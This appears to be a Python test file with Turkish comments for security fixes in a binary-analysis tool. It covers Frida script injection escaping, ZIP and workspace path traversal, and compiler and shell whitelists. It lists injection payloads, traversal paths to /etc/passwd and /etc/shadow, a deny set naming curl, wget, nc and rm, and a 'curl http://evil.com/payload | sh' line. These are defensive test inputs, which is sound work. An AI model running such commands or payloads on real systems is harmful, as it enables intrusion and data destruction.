"""v1.9.2 Guvenlik fix'leri testleri.

Test edilen:
- Frida JS injection escape (CWE-94): dump_module'da json.dumps ile escape
- ZIP path traversal engeli (CWE-22): _extract_archive'da traversal kontrolu
- Workspace load_artifact path traversal (CWE-22): resolve + startswith kontrolu
- Compiler whitelist (CWE-78): _run_compile_step ve _run_shell_step
- CLI run komutu guvenlik uyarisi: --yes flag'i
"""

from __future__ import annotations

import io
import json
import os
import struct
import tempfile
import zipfile
from pathlib import Path
from typing import Any
from unittest import mock

import pytest

# ---------------------------------------------------------------------------
# 1. Frida JS Injection Escape
# ---------------------------------------------------------------------------


class TestFridaJSInjectionEscape:
    """MemoryScanner.dump_module icindeki json.dumps escape kontrolu.

    Gercek Frida session baslatmiyoruz. Script source string'ini kontrol
    ediyoruz: injection payload calistirilabilir olmamali, json.dumps ile
    escape edilmis olmali.
    """

    INJECTION_PAYLOADS = [
        '"); Process.exit(0); //',
        "'); Process.exit(0); //",
        '"; send({type:"pwned"}); //',
        "test\nProcess.exit(0)",
        'test\\"; Process.exit(0); //',
        "module_name_with_quotes\"and'more",
    ]

    @staticmethod
    def _build_dump_script_source(module_name: str) -> str:
        """dump_module'un script_source olusturma mantigini cikartir.

        Bu fonksiyon MemoryScanner.dump_module icerisindeki script_source
        olusturma adiminin aynisini uygular -- session baslatmadan.
        """
        safe_name = json.dumps(module_name)

        script_source = f"""
        (function() {{
            try {{
                var mod = Process.getModuleByName({safe_name});
                if (mod) {{
                    var data = mod.base.readByteArray(mod.size);
                    send({{
                        type: 'module_dump',
                        name: mod.name,
                        base: mod.base.toString(),
                        size: mod.size
                    }}, data);
                }} else {{
                    send({{ type: 'module_dump_error', error: 'Module not found: ' + {safe_name} }});
                }}
            }} catch (e) {{
                send({{ type: 'module_dump_error', error: e.toString() }});
            }}
        }})();
        """
        return script_source

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=[
        "process_exit_double_quote",
        "process_exit_single_quote",
        "send_pwned",
        "newline_injection",
        "escaped_backslash_quote",
        "mixed_quotes",
    ])
    def test_injection_payload_is_escaped(self, payload: str) -> None:
        """Injection payload'i script source'da calistirilabilir olmamali."""
        script = self._build_dump_script_source(payload)

        # json.dumps payload'i tirnak icinde guvenli bir string'e donusturur.
        # Script icinde payload'in raw hali BULUNMAMALI.
        # json.dumps("abc") -> '"abc"' (tirnak dahil) bu yuzden
        # Process.getModuleByName("...") seklinde embed edilir.
        safe = json.dumps(payload)

        # safe_name (json.dumps ciktisi) script icinde yer almali
        assert safe in script, (
            f"json.dumps ciktisi script icinde bulunamadi: {safe!r}"
        )

        # Ek kontrol: payload'daki tehlikeli parcalar string literal disina cikmamali.
        # getModuleByName(...) cagrisinin parametresini cikar:
        # Script icinde tam olarak getModuleByName(<safe_name>) olmali
        assert f"Process.getModuleByName({safe})" in script

    def test_normal_module_name_works(self) -> None:
        """Normal module ismi (injection icermeyen) sorunsuz calisir."""
        script = self._build_dump_script_source("libcrypto.dylib")
        assert 'Process.getModuleByName("libcrypto.dylib")' in script

    def test_json_dumps_preserves_original_on_decode(self) -> None:
        """json.dumps ile escape edilen deger, JSON parse sonrasi orijinale esit."""
        for payload in self.INJECTION_PAYLOADS:
            safe = json.dumps(payload)
            decoded = json.loads(safe)
            assert decoded == payload, (
                f"Round-trip basarisiz: {payload!r} -> {safe!r} -> {decoded!r}"
            )


# ---------------------------------------------------------------------------
# 2. ZIP Path Traversal (CWE-22)
# ---------------------------------------------------------------------------


class TestZIPPathTraversal:
    """reference_populator._extract_archive'in path traversal kontrolu."""

    @staticmethod
    def _create_malicious_zip(dest: Path, member_name: str = "../../etc/passwd") -> Path:
        """Kotucul member name'li bir ZIP dosyasi olusturur."""
        zip_path = dest / "malicious.zip"
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr(member_name, "root:x:0:0:root:/root:/bin/bash\n")
        return zip_path

    @staticmethod
    def _create_normal_zip(dest: Path) -> Path:
        """Normal, guvenli bir ZIP dosyasi olusturur."""
        zip_path = dest / "normal.zip"
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr("src/main.c", '#include <stdio.h>\nint main() { return 0; }\n')
            zf.writestr("README.txt", "Test project\n")
        return zip_path

    def test_malicious_zip_raises_valueerror(self, tmp_path: Path) -> None:
        """../../etc/passwd member'li ZIP extract'i ValueError firlatir."""
        from karadul.reconstruction.reference_populator import ReferencePopulator

        zip_path = self._create_malicious_zip(tmp_path)
        extract_dir = tmp_path / "extract"
        extract_dir.mkdir()

        with pytest.raises(ValueError, match="(?i)path traversal"):
            ReferencePopulator._extract_archive(zip_path, extract_dir, "zip")

    @pytest.mark.parametrize("member_name", [
        "../../etc/passwd",
        "../../../tmp/evil.sh",
        "foo/../../bar/baz",
        "foo/../../../etc/shadow",
    ], ids=["etc_passwd", "tmp_evil", "nested_traversal", "deep_nested"])
    def test_various_traversal_paths_rejected(self, tmp_path: Path, member_name: str) -> None:
        """Cesitli path traversal pattern'leri reddedilir."""
        from karadul.reconstruction.reference_populator import ReferencePopulator

        zip_path = self._create_malicious_zip(tmp_path, member_name=member_name)
        extract_dir = tmp_path / "extract"
        extract_dir.mkdir()

        with pytest.raises(ValueError, match="(?i)path traversal|traversal"):
            ReferencePopulator._extract_archive(zip_path, extract_dir, "zip")

    def test_normal_zip_extracts_ok(self, tmp_path: Path) -> None:
        """Normal ZIP dosyasi sorunsuz extract edilir."""
        from karadul.reconstruction.reference_populator import ReferencePopulator

        zip_path = self._create_normal_zip(tmp_path)
        extract_dir = tmp_path / "extract"
        extract_dir.mkdir()

        # Hata firlatmamali
        ReferencePopulator._extract_archive(zip_path, extract_dir, "zip")

        # Dosyalar extract edilmis olmali
        assert (extract_dir / "src" / "main.c").exists()
        assert (extract_dir / "README.txt").exists()


# ---------------------------------------------------------------------------
# 3. Workspace load_artifact Path Traversal (CWE-22)
# ---------------------------------------------------------------------------


class TestWorkspacePathTraversal:
    """Workspace.load_artifact ve save_artifact icin path traversal testleri."""

    @pytest.fixture
    def workspace(self, tmp_path: Path) -> Any:
        """Gecici dizinde bir Workspace olustur."""
        from karadul.core.workspace import Workspace

        ws = Workspace(base_dir=tmp_path, target_name="test_target")
        ws.create()
        return ws

    def test_load_artifact_traversal_raises(self, workspace: Any) -> None:
        """load_artifact ile path traversal denemesi ValueError firlatir."""
        with pytest.raises(ValueError, match="(?i)path traversal"):
            workspace.load_artifact("static", "../../../etc/passwd")

    def test_save_artifact_traversal_raises(self, workspace: Any) -> None:
        """save_artifact ile path traversal denemesi ValueError firlatir."""
        with pytest.raises(ValueError, match="(?i)path traversal"):
            workspace.save_artifact("static", "../../../etc/passwd", "evil content")

    @pytest.mark.parametrize("malicious_name", [
        "../../../etc/passwd",
        "../../secret.key",
        "../outside.txt",
        "foo/../../bar/../../../etc/shadow",
    ], ids=["etc_passwd", "secret_key", "parent_dir", "deep_traversal"])
    def test_various_load_traversal_patterns(self, workspace: Any, malicious_name: str) -> None:
        """Cesitli traversal pattern'leri reddedilir (load)."""
        with pytest.raises(ValueError, match="(?i)path traversal"):
            workspace.load_artifact("static", malicious_name)

    @pytest.mark.parametrize("malicious_name", [
        "../../../etc/passwd",
        "../../secret.key",
        "../outside.txt",
    ], ids=["etc_passwd", "secret_key", "parent_dir"])
    def test_various_save_traversal_patterns(self, workspace: Any, malicious_name: str) -> None:
        """Cesitli traversal pattern'leri reddedilir (save)."""
        with pytest.raises(ValueError, match="(?i)path traversal"):
            workspace.save_artifact("static", malicious_name, b"data")

    def test_normal_load_artifact(self, workspace: Any) -> None:
        """Normal dosya adi ile load_artifact calisir (dosya yoksa None doner)."""
        result = workspace.load_artifact("static", "normal_file.json")
        assert result is None  # dosya yok ama hata yok

    def test_normal_save_and_load_roundtrip(self, workspace: Any) -> None:
        """Normal save+load roundtrip calisiyor."""
        data = '{"key": "value"}'
        workspace.save_artifact("static", "test.json", data)
        loaded = workspace.load_artifact("static", "test.json")
        assert loaded == data

    def test_binary_save_and_load(self, workspace: Any) -> None:
        """Binary data save+load calisiyor."""
        data = b"\x00\x01\x02\xff\xfe\xfd"
        workspace.save_artifact("static", "test.bin", data)
        loaded = workspace.load_artifact("static", "test.bin")
        assert loaded == data


# ---------------------------------------------------------------------------
# 4. Compiler Whitelist (CWE-78)
# ---------------------------------------------------------------------------


class TestCompilerWhitelist:
    """Compiler ve shell command whitelist testleri."""

    def test_allowed_compilers_frozenset_exists(self) -> None:
        """_ALLOWED_COMPILERS frozenset'i tanimli ve bos degil."""
        from karadul.reconstruction.reference_populator import _ALLOWED_COMPILERS

        assert isinstance(_ALLOWED_COMPILERS, frozenset)
        assert len(_ALLOWED_COMPILERS) > 0
        # Beklenen compiler'lar mevcut
        assert "gcc" in _ALLOWED_COMPILERS
        assert "clang" in _ALLOWED_COMPILERS
        assert "cc" in _ALLOWED_COMPILERS

    def test_allowed_shell_cmds_frozenset_exists(self) -> None:
        """_ALLOWED_SHELL_CMDS frozenset'i tanimli ve bos degil."""
        from karadul.reconstruction.reference_populator import _ALLOWED_SHELL_CMDS

        assert isinstance(_ALLOWED_SHELL_CMDS, frozenset)
        assert len(_ALLOWED_SHELL_CMDS) > 0
        assert "make" in _ALLOWED_SHELL_CMDS

    def test_dangerous_compilers_not_in_whitelist(self) -> None:
        """Tehlikeli compiler/komutlar whitelist'te olmamali."""
        from karadul.reconstruction.reference_populator import _ALLOWED_COMPILERS

        dangerous = {"bash", "sh", "python", "python3", "perl", "ruby", "curl", "wget", "nc"}
        overlap = _ALLOWED_COMPILERS & dangerous
        assert not overlap, f"Tehlikeli komutlar whitelist'te: {overlap}"

    def test_dangerous_shell_cmds_not_in_whitelist(self) -> None:
        """Tehlikeli shell komutlari whitelist'te olmamali."""
        from karadul.reconstruction.reference_populator import _ALLOWED_SHELL_CMDS

        dangerous = {"bash", "sh", "python", "python3", "curl", "wget", "nc", "rm", "dd"}
        overlap = _ALLOWED_SHELL_CMDS & dangerous
        assert not overlap, f"Tehlikeli komutlar whitelist'te: {overlap}"

    @pytest.fixture
    def populator(self, tmp_path: Path) -> Any:
        """Gecici cache dizinli ReferencePopulator."""
        from karadul.reconstruction.reference_populator import ReferencePopulator

        return ReferencePopulator(
            cache_dir=tmp_path / "cache",
            skip_ghidra=True,
        )

    @pytest.mark.parametrize("evil_compiler", [
        "bash",
        "/bin/sh",
        "python3",
        "curl",
        "wget",
        "/usr/bin/perl",
    ], ids=["bash", "bin_sh", "python3", "curl", "wget", "perl_abs"])
    def test_compile_step_rejects_unlisted_compiler(
        self, populator: Any, tmp_path: Path, evil_compiler: str
    ) -> None:
        """Whitelist'te olmayan compiler ile _run_compile_step False doner."""
        build_dir = tmp_path / "build"
        build_dir.mkdir()

        step = {
            "compiler": evil_compiler,
            "args": ["-c", "evil.c"],
            "source_file": "",
        }

        result = populator._run_compile_step(build_dir, step)
        assert result is False, f"Compiler '{evil_compiler}' kabul edilmemeli"

    @pytest.mark.parametrize("evil_cmd", [
        "bash",
        "/bin/sh",
        "python3",
        "curl http://evil.com/payload | sh",
        "rm",
        "/usr/bin/wget",
    ], ids=["bash", "bin_sh", "python3", "curl_pipe", "rm", "wget_abs"])
    def test_shell_step_rejects_unlisted_command(
        self, populator: Any, tmp_path: Path, evil_cmd: str
    ) -> None:
        """Whitelist'te olmayan shell komutu ile _run_shell_step False doner."""
        build_dir = tmp_path / "build"
        build_dir.mkdir()

        step = {
            "command": evil_cmd,
            "args": [],
        }

        result = populator._run_shell_step(build_dir, step)
        assert result is False, f"Komut '{evil_cmd}' kabul edilmemeli"

    def test_allowed_compiler_not_rejected(self, populator: Any, tmp_path: Path) -> None:
        """Whitelist'teki compiler reject edilmez (dosya bulunamazsa FileNotFoundError)."""
        build_dir = tmp_path / "build"
        build_dir.mkdir()

        # cc whitelist'te. Gercek derleme yapmak zorunda degiliz --
        # sadece whitelist kontrolunun gectigini dogrulamak istiyoruz.
        # Kaynak dosya olmadigi icin False donecek (source_file yoksa devam eder,
        # ama derleme basarisiz olur). Onemli olan: whitelist log mesaji olmamasi.
        step = {
            "compiler": "cc",
            "args": ["-c", "nonexistent.c", "-o", "out.o"],
            "source_file": "nonexistent.c",
        }

        # source_file bulunamadigindan False donecek ama bu whitelist reddi degil
        result = populator._run_compile_step(build_dir, step)
        # False donmesi ok -- onemli olan "Izin verilmeyen compiler" log'u olmamasi
        # Asil dogrulama: compiler_base "cc" whitelist'te, logger.warning cagirilmamali
        assert result is False  # kaynak dosya yok

    def test_allowed_compiler_passes_whitelist(self, populator: Any, tmp_path: Path) -> None:
        """Whitelist'teki compiler icin warning loglama yapilmaz."""
        build_dir = tmp_path / "build"
        build_dir.mkdir()

        step = {
            "compiler": "cc",
            "args": [],
            "source_file": "",  # source_file bos, kontrol atlanir
        }

        with mock.patch("karadul.reconstruction.reference_populator.logger") as mock_logger:
            populator._run_compile_step(build_dir, step)
            # "Izin verilmeyen compiler" warning'i olmamali
            for call in mock_logger.warning.call_args_list:
                assert "Izin verilmeyen" not in str(call), (
                    f"Whitelist'teki compiler icin warning loglanmis: {call}"
                )


# ---------------------------------------------------------------------------
# 5. CLI run --yes Flag (CWE-94 Uyarisi)
# ---------------------------------------------------------------------------


class TestCLIRunYesFlag:
    """karadul run komutunun --yes flag'i kabul ettigini dogrula."""

    def test_run_command_has_yes_option(self) -> None:
        """run komutu --yes / -y flag'i tanimli olmali."""
        from karadul.cli import run

        # Click command parametrelerini kontrol et
        param_names = [p.name for p in run.params]
        assert "yes" in param_names, "'yes' parametresi run komutunda tanimli degil"

        # is_flag=True olmali
        yes_param = next(p for p in run.params if p.name == "yes")
        assert yes_param.is_flag, "'yes' parametresi is_flag=True olmali"

    def test_run_command_accepts_y_short_flag(self) -> None:
        """run komutu -y kisa flag'ini kabul etmeli."""
        from karadul.cli import run

        yes_param = next(p for p in run.params if p.name == "yes")
        # Click'te opts listesinde hem --yes hem -y olmali
        assert "--yes" in yes_param.opts or "-y" in yes_param.opts
        assert "-y" in yes_param.secondary_opts or "-y" in yes_param.opts

    def test_run_without_yes_prompts_user(self) -> None:
        """--yes olmadan run komutu kullaniciya guvenlik sorusu sormali."""
        from click.testing import CliRunner
        from karadul.cli import main

        runner = CliRunner()

        # Var olmayan target -- workspace bulunamaz hatasina kadar gitmeli
        # ama flag yoklugunda confirmation prompt olmali
        result = runner.invoke(main, ["run", "nonexistent_target"])
        # HATA ciktisi olmali (workspace bulunamaz) -- bu beklenen
        # Onemli olan: --yes yoksa ve workspace varsa prompt gelmesi
        assert result.exit_code != 0  # workspace yok, hata bekleniyor

    def test_run_with_yes_skips_prompt(self) -> None:
        """--yes ile run komutu confirmation prompt'u atlar."""
        from click.testing import CliRunner
        from karadul.cli import main

        runner = CliRunner()

        # Var olmayan target -- workspace bulunamaz hatasiyla cikar
        result = runner.invoke(main, ["run", "nonexistent_target", "--yes"])
        # Workspace bulunamadi hatasi bekleniyor, confirmation sorulmadan
        assert result.exit_code != 0
        assert "HATA" in result.output or "bulunamadi" in result.output.lower() or result.exit_code != 0

    def test_run_with_y_short_flag(self) -> None:
        """-y kisa flag ile run komutu confirmation atlar."""
        from click.testing import CliRunner
        from karadul.cli import main

        runner = CliRunner()

        result = runner.invoke(main, ["run", "nonexistent_target", "-y"])
        # Ayni davranis: workspace bulunamadi hatasi
        assert result.exit_code != 0


# ---------------------------------------------------------------------------
# 6. Ek: Frida _build_scan_script pattern injection
# ---------------------------------------------------------------------------


class TestFridaScanScriptInjection:
    """MemoryScanner._build_scan_script'in json.dumps ile pattern embed'i."""

    def test_scan_script_patterns_json_embedded(self) -> None:
        """_build_scan_script pattern'leri json.dumps ile embed eder."""
        from karadul.frida.collectors.memory_scanner import MemoryScanner

        malicious_patterns = [
            'normal_pattern',
            '"; Process.exit(0); //',
            "test'); system('rm -rf /'); //",
        ]

        script = MemoryScanner._build_scan_script(malicious_patterns, min_length=8)

        # json.dumps ile embed edilmis olmali
        embedded = json.dumps(malicious_patterns)
        assert embedded in script, (
            "Pattern'ler json.dumps ile embed edilmemis"
        )

    def test_byte_scan_script_json_embedded(self) -> None:
        """_build_byte_scan_script pattern'leri json.dumps ile embed eder."""
        from karadul.frida.collectors.memory_scanner import MemoryScanner

        patterns = [
            {"name": '"; evil()', "hex": "00 01 02"},
        ]

        script = MemoryScanner._build_byte_scan_script(patterns)

        # json.dumps ile embed edilmis olmali
        embedded = json.dumps(patterns)
        assert embedded in script
